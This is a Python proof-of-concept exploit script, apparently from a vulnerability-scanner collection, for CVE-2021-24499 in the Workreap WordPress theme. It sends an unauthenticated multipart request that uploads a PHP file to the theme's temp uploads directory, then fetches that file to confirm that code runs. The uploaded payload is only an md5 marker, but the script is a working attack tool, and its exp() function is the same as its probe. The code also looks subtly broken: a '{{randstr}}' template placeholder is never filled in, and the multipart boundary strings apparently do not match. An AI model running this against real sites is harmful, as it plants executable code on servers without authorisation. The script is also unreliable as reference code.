import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Workreap WordPress theme - unauthenticated RCE''',
        "description": '''The AJAX actions workreap_award_temp_file_uploader and workreap_temp_file_uploader did not perform nonce checks, or validate that the request is from a valid user in any other way. The endpoints allowed for uploading arbitrary files to the uploads/workreap-temp directory. Uploaded files were neither sanitized nor validated, allowing an unauthenticated visitor to upload executable code such as php scripts.''',
        "severity": "critical",
        "references": [
            "https://github.com/RyouYoo/CVE-2021-24499", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-24499"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-24499",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "wordpress", "wp-plugin", "rce", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-admin/admin-ajax.php"""
        method = "POST"
        data = """-----------------------------cd0dc6bdc00b1cf9
Content-Disposition: form-data; name="action"

workreap_award_temp_file_uploader
-----------------------------cd0dc6bdc00b1cf9
Content-Disposition: form-data; name="award_img"; filename="{{randstr}}.php"
Content-Type: application/x-httpd-php

<?php echo md5("CVE-2021-24499"); ?>
-----------------------------cd0dc6bdc00b1cf9--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9', 'X-Requested-With': 'XMLHttpRequest'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-content/uploads/workreap-temp/{{randstr}}.php"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""71abe5077dae2754c36d731cc1534d4d""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url